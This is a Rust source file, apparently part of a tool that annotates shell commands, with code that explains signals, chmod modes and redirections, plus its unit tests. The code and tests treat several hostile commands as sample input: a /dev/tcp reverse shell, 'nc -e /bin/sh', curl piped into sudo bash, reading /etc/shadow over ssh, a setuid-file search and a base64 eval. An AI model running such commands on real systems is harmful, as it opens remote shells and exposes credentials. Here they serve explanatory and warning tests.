        "function" => "Defines a shell function.",
        "{" => "Start of a command group, run in the current shell.",
        "}" => "End of the command group.",
        "!" => "Negates the exit status of the following command.",
        "coproc" => "Runs the command as a coprocess connected to the shell by pipes.",
        _ => return None,
    })
}

fn signal(body: &str) -> Option<String> {
    let name = body.trim_start_matches("SIG").to_ascii_uppercase();
    let (num, what) = match name.as_str() {
        "1" | "HUP" => (1, "hang up; many daemons reload their configuration"),
        "2" | "INT" => (2, "interrupt, like Ctrl+C"),
        "3" | "QUIT" => (3, "quit and dump core"),
        "9" | "KILL" => (9, "stop at once; cannot be caught or ignored"),
        "15" | "TERM" => (15, "ask the process to exit (the default)"),
        "18" | "CONT" => (18, "continue a stopped process"),
        "19" | "STOP" => (19, "pause the process; cannot be caught"),
        "10" | "USR1" => (10, "user-defined signal 1"),
        "12" | "USR2" => (12, "user-defined signal 2"),
        "0" => (0, "send nothing; check the process exists"),
        _ => return None,
    };
    Some(format!(
        "Signal {num}: {what}. Numbers can differ between systems for USR1, USR2, CONT and STOP."
    ))
}

/// Remarks about an operand's value. Returns entries and whether it is worth a warning.
fn value_notes(cmd: &str, pos: usize, v: &str, f: WordFlags) -> (Vec<Entry>, bool) {
    let mut out = Vec::new();
    let mut warn = false;
    for proto in ["tcp", "udp"] {
        if let Some(rest) = v.strip_prefix(&format!("/dev/{proto}/")) {
            let (host, port) = rest.split_once('/').unwrap_or((rest, "?"));
            out.push(entry(
                format!("/dev/{proto}"),
                format!(
                    "Bash opens a {} connection to {host} port {port} when this path is redirected. Common in reverse shells.",
                    proto.to_uppercase()
                ),
                Source::Shell,
            ));
            warn = true;
        }
    }
    match v {
        "/dev/null" => out.push(entry(
            "/dev/null",
            "Discards everything written to it; reads as empty.",
            Source::Shell,
        )),
        "/dev/stdin" | "/dev/stdout" | "/dev/stderr" => {
            out.push(entry(
                v,
                "The process's own standard stream.",
                Source::Shell,
            ));
        }
        _ => {}
    }
    if let Some((scheme, rest)) = v.split_once("://")
        && !scheme.is_empty()
        && scheme
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "+.-".contains(c))
    {
        let host = rest.split(['/', '?', '#']).next().unwrap_or("");
        let host = host.rsplit('@').next().unwrap_or(host);
        out.push(entry(
            "",
            format!("{scheme} URL, host {host}."),
            Source::Shell,
        ));
    }
    if cmd == "chmod"
        && pos == 0
        && let Some((text, w)) = chmod_mode(v)
    {
        out.push(entry("mode", text, Source::Builtin));
        warn |= w;
    }
    if f.glob && !v.contains("://") {
        out.push(entry(
            "",
            "Contains * ? or [: the shell expands it to matching file names.",
            Source::Shell,
        ));
    }
    if f.expands {
        out.push(entry(
            "",
            "Contains $ expansions or substitutions, so the value is only known at run time.",
            Source::Shell,
        ));
    }
    (out, warn)
}

fn warn_note(v: &str) -> &'static str {
    if v.contains("/dev/tcp/") || v.contains("/dev/udp/") {
        "Uses /dev/tcp or /dev/udp, which Bash turns into a network connection. Common in reverse shells."
    } else {
        "Sets the setuid or setgid bit, so the program runs with its owner's or group's rights."
    }
}

/// Describe a chmod mode. Returns the text and whether it sets setuid or setgid.
fn chmod_mode(m: &str) -> Option<(String, bool)> {
    if (3..=4).contains(&m.len()) && m.chars().all(|c| ('0'..='7').contains(&c)) {
        let digits: Vec<u32> = m.chars().filter_map(|c| c.to_digit(8)).collect();
        let (special, rest) = if digits.len() == 4 {
            (digits[0], &digits[1..])
        } else {
            (0, &digits[..])
        };
        let rwx = |d: u32| {
            format!(
                "{}{}{}",
                if d & 4 != 0 { 'r' } else { '-' },
                if d & 2 != 0 { 'w' } else { '-' },
                if d & 1 != 0 { 'x' } else { '-' }
            )
        };
        let mut text = format!(
            "{}{}{}: owner {}, group {}, others {}.",
            rwx(rest[0]),
            rwx(rest[1]),
            rwx(rest[2]),
            rwx(rest[0]),
            rwx(rest[1]),
            rwx(rest[2])
        );
        if special & 4 != 0 {
            text.push_str(" Setuid: runs with the file owner's rights.");
        }
        if special & 2 != 0 {
            text.push_str(" Setgid: runs with the file group's rights.");
        }
        if special & 1 != 0 {
            text.push_str(" Sticky bit: only owners can delete files in the directory.");
        }
        if rest[2] & 2 != 0 {
            text.push_str(" Anyone can write to it.");
        }
        return Some((text, special & 6 != 0));
    }
    let valid = !m.is_empty() && m.chars().all(|c| "ugoa+-=rwxXst,".contains(c));
    if !valid {
        return None;
    }
    let mut parts = Vec::new();
    let mut setid = false;
    for clause in m.split(',') {
        let Some(opi) = clause.find(['+', '-', '=']) else {
            continue;
        };
        let who = match &clause[..opi] {
            "" | "a" => "everyone".to_string(),
            w => w
                .chars()
                .map(|c| match c {
                    'u' => "owner",
                    'g' => "group",
                    'o' => "others",
                    _ => "everyone",
                })
                .collect::<Vec<_>>()
                .join(" and "),
        };
        let op = match &clause[opi..=opi] {
            "+" => "add",
            "-" => "remove",
            _ => "set exactly",
        };
        let perms: Vec<&str> = clause[opi + 1..]
            .chars()
            .map(|c| match c {
                'r' => "read",
                'w' => "write",
                'x' => "execute",
                'X' => "execute (directories only)",
                's' => {
                    if op == "add" || op == "set exactly" {
                        setid = true;
                    }
                    "setuid/setgid"
                }
                't' => "sticky",
                _ => "?",
            })
            .collect();
        parts.push(format!("{op} {} for {who}", perms.join(", ")));
    }
    if parts.is_empty() {
        return None;
    }
    Some((format!("{}.", capitalize(&parts.join("; "))), setid))
}

fn capitalize(s: &str) -> String {
    let mut c = s.chars();
    match c.next() {
        Some(f) => f.to_uppercase().collect::<String>() + c.as_str(),
        None => String::new(),
    }
}

fn find_long(docs: &[Option<&Doc>], key: &str) -> Option<Opt> {
    for d in docs.iter().flatten() {
        if let Some(o) = d.opts.iter().find(|o| o.long.iter().any(|l| l == key)) {
            return Some(o.clone());
        }
    }
    // getopt_long accepts unambiguous prefixes.
    if key.len() >= 3 {
        for d in docs.iter().flatten() {
            let hits: Vec<&Opt> = d
                .opts
                .iter()
                .filter(|o| o.long.iter().any(|l| l.starts_with(key)))
                .collect();
            if hits.len() == 1 {
                return Some(hits[0].clone());
            }
        }
    }
    None
}

fn find_word(docs: &[Option<&Doc>], key: &str) -> Option<Opt> {
    let mut chars = key.chars();
    let single = match (chars.next(), chars.next()) {
        (Some(c), None) => Some(c),
        _ => None,
    };
    for d in docs.iter().flatten() {
        let hit = d.opts.iter().find(|o| {
            o.word.iter().any(|w| w.eq_ignore_ascii_case(key))
                || single.is_some_and(|c| o.short.contains(&c))
        });
        if let Some(o) = hit {
            return Some(o.clone());
        }
    }
    None
}

fn find_short(docs: &[Option<&Doc>], c: char) -> Option<Opt> {
    find_short_src(docs, c).map(|(o, _)| o)
}

fn find_short_src(docs: &[Option<&Doc>], c: char) -> Option<(Opt, Source)> {
    docs.iter().flatten().find_map(|d| {
        d.opts
            .iter()
            .find(|o| o.short.contains(&c))
            .map(|o| (o.clone(), d.source))
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ex(s: &str) -> Explanation {
        explain(s, &NoMan)
    }

    fn item<'a>(e: &'a Explanation, label: &str) -> &'a Item {
        e.items
            .iter()
            .find(|i| i.label == label)
            .unwrap_or_else(|| {
                panic!(
                    "no item {label:?} in {:?}",
                    e.items.iter().map(|i| &i.label).collect::<Vec<_>>()
                )
            })
    }

    fn text(i: &Item) -> String {
        i.entries
            .iter()
            .map(|e| format!("{} {}", e.term, e.text))
            .collect::<Vec<_>>()
            .join(" | ")
    }

    #[test]
    fn pieces_rebuild_the_input() {
        for s in [
            "curl -fsSL https://x.test/a.sh | sudo bash -s -- -y  # go",
            "a=1 b=2\n\tfoo",
            "cat <<EOF\nhi\nEOF\n",
        ] {
            let e = ex(s);
            let joined: String = e.pieces.iter().map(|p| p.text.as_str()).collect();
            assert_eq!(joined, s);
        }
    }

    #[test]
    fn pipeline_with_options() {
        let e = ex("curl -fsSL https://x.test/i.sh | sudo bash");
        let c = item(&e, "-fsSL");
        let t = text(c);
        assert!(
            t.contains("--fail")
                && t.contains("--silent")
                && t.contains("--show-error")
                && t.contains("--location"),
            "{t}"
        );
        assert!(text(item(&e, "https://x.test/i.sh")).contains("host x.test"));
        assert_eq!(item(&e, "|").kind, Kind::Operator);
        assert_eq!(item(&e, "bash").kind, Kind::Command);
        assert!(
            item(&e, "bash").warn,
            "pipe into shell through sudo should warn"
        );
        assert!(!e.notes.is_empty());
    }

    #[test]
    fn items_in_source_order() {
        let e = ex("cat f | sh -i 2>&1 | nc h 1 > f");
        let labels: Vec<&str> = e.items.iter().map(|i| i.label.as_str()).collect();
        assert_eq!(
            labels,
            [
                "cat", "f", "|", "sh", "-i", "2>&1", "|", "nc", "h", "1", "> f"
            ]
        );
        assert!(e.items.iter().enumerate().all(|(n, i)| i.id == n));
        assert!(
            e.pieces
                .iter()
                .filter_map(|p| p.item)
                .all(|id| id < e.items.len())
        );
    }

    #[test]
    fn option_arguments_group() {
        let e = ex("curl -o out.bin --user-agent=Foo -H 'X: 1' http://h/");
        assert!(text(item(&e, "-o out.bin")).contains("Value: out.bin"));
        assert!(text(item(&e, "--user-agent=Foo")).contains("Value: Foo"));
        assert!(text(item(&e, "-H 'X: 1'")).contains("Value: X: 1"));
        // Abbreviated long option.
        let e = ex("curl --insec http://h/");
        assert!(text(item(&e, "--insec")).contains("certificate"));
    }

    #[test]
    fn redirections() {
        let e = ex("cmd >/dev/null 2>&1 < in.txt");
        assert!(text(item(&e, ">/dev/null")).contains("standard output to the file /dev/null"));
        assert!(
            text(item(&e, "2>&1")).contains("standard error to the same place as standard output")
        );
        assert!(text(item(&e, "< in.txt")).contains("Read standard input"));
        let e = ex("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1");
        let r = item(&e, ">& /dev/tcp/203.0.113.9/4444");
        assert!(r.warn);
        assert!(text(r).contains("203.0.113.9 port 4444"));
    }

    #[test]
    fn nested_shell_c_and_substitution() {
        let e = ex("sh -c 'echo $(id -u) | nc -e /bin/sh 192.0.2.1 9'");
        let s = item(&e, "'echo $(id -u) | nc -e /bin/sh 192.0.2.1 9'");
        let inner = &s.nested[0].explanation;
        assert!(inner.items.iter().any(|i| i.label == "nc"));
        let ec = inner
            .items
            .iter()
            .find(|i| i.label == "-e /bin/sh")
            .unwrap();
        assert!(text(ec).contains("remote shell"));
        let echo_arg = inner.items.iter().find(|i| i.label == "$(id -u)").unwrap();
        assert!(
            echo_arg.nested[0]
                .explanation
                .items
                .iter()
                .any(|i| i.label == "id")
        );
        // -lc cluster still sets the command string.
        let e = ex("bash -lc 'whoami'");
        assert!(!item(&e, "'whoami'").nested.is_empty());
    }

    #[test]
    fn wrappers_and_assignments() {
        let e = ex("sudo -u bob env -i FOO=1 nohup python3 -c 'print(1)' &");
        assert_eq!(item(&e, "sudo").kind, Kind::Command);
        assert!(text(item(&e, "-u bob")).contains("Value: bob"));
        assert_eq!(item(&e, "env").kind, Kind::Command);
        assert_eq!(item(&e, "FOO=1").kind, Kind::Assignment);
        assert_eq!(item(&e, "nohup").kind, Kind::Command);
        assert_eq!(item(&e, "python3").kind, Kind::Command);
        assert!(text(item(&e, "-c 'print(1)'")).contains("Python code"));
        let e = ex("LANG=C sort -u f");
        assert!(text(item(&e, "LANG=C")).contains("this command only"));
        let e = ex("X=$(whoami)");
        assert!(text(item(&e, "X=$(whoami)")).contains("shell variable"));
        assert!(!item(&e, "X=$(whoami)").nested.is_empty());
    }

    #[test]
    fn bundled_tar_and_dd_and_find() {
        let e = ex("tar xzvf a.tgz -C /tmp");
        let t = text(item(&e, "xzvf a.tgz"));
        assert!(
            t.contains("Extract") && t.contains("gzip") && t.contains("Value: a.tgz"),
            "{t}"
        );
        let e = ex("dd if=/dev/zero of=disk.img bs=1M count=10");
        assert!(text(item(&e, "if=/dev/zero")).contains("Read from"));
        let e = ex(r"find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null");
        assert!(text(item(&e, "-perm -4000")).contains("setuid"));
        let x = e
            .items
            .iter()
            .find(|i| i.label.starts_with("-exec"))
            .unwrap();
        assert!(text(x).contains("once for each path"));
        assert!(
            x.nested[0]
                .explanation
                .items
                .iter()
                .any(|i| i.label == "ls")
        );
    }

    #[test]
    fn subcommands_and_keywords() {
        let e = ex("git clone --depth 1 https://h/r.git && systemctl enable --now foo");
        assert!(text(item(&e, "clone")).contains("Copy a repository"));
        assert!(text(item(&e, "--depth 1")).contains("latest"));
        assert!(text(item(&e, "enable")).contains("boot"));
        let e = ex("for f in *.log; do gzip \"$f\"; done");
        assert_eq!(item(&e, "for").kind, Kind::Keyword);
        assert!(text(item(&e, "*.log")).contains("expands"));
        assert_eq!(item(&e, "done").kind, Kind::Keyword);
        assert_eq!(item(&e, "gzip").kind, Kind::Command);
    }

    #[test]
    fn chmod_and_signals() {
        let e = ex("chmod 4755 /tmp/x");
        let m = item(&e, "4755");
        assert!(m.warn && text(m).contains("rwxr-xr-x") && text(m).contains("Setuid"));
        let e = ex("chmod u+s,o-w f");
        assert!(item(&e, "u+s,o-w").warn);
        let e = ex("kill -9 1234; pkill -HUP nginx");
        assert!(text(item(&e, "-9")).contains("SIGKILL"));
        assert!(text(item(&e, "-HUP")).contains("hang up"));
    }

    #[test]
    fn eval_and_ssh_remote() {
        let e = ex("ssh -p 2222 root@host 'cat /etc/shadow'");
        let r = item(&e, "'cat /etc/shadow'");
        assert!(
            r.nested[0]
                .explanation
                .items
                .iter()
                .any(|i| i.label == "cat")
        );
        let e = ex("eval \"$(echo ZWNobyBoaQ== | base64 -d)\"");
        assert!(!e.items.is_empty());
    }

    #[test]
    fn unknown_command_and_options() {
        let e = ex("frobnicate -x --yes file");
        assert_eq!(item(&e, "frobnicate").entries[0].source, Source::Unknown);
        assert_eq!(item(&e, "-x").kind, Kind::Option);
        let e = ex("$CMD arg");
        assert!(item(&e, "$CMD").warn);
    }

    #[test]
    fn hostile_and_large_inputs() {
        let deep = "bash -c \"".repeat(50);
        let _ = ex(&deep);
        let nested = "$(".repeat(5000);
        let _ = ex(&nested);
        let big = "echo a; ".repeat(20_000);
        let e = ex(&big);
        assert!(e.truncated);
        let _ = ex("chmod 9999 x; kill -; tar ; find -exec ; dd =");
    }

    struct FakeMan;
    impl ManLookup for FakeMan {
        fn lookup(&self, name: &str) -> Option<Arc<Doc>> {
            (name == "frob").then(|| {
                let mut o = db::parse_opt_spec("-q --quiet").unwrap();
                o.help = "Be quiet.".into();
                Arc::new(Doc::from_man("frob", "Frobnicate things.".into(), vec![o]))
            })
        }
    }

    #[test]
    fn man_fallback() {
        let e = explain("frob -q --quiet", &FakeMan);
        let c = e.items.iter().find(|i| i.label == "frob").unwrap();
        assert_eq!(c.entries[0].source, Source::Man);
        assert_eq!(c.entries[0].text, "Frobnicate things.");
        let q = e.items.iter().find(|i| i.label == "-q").unwrap();
        assert_eq!(q.entries[0].source, Source::Man);
    }
}
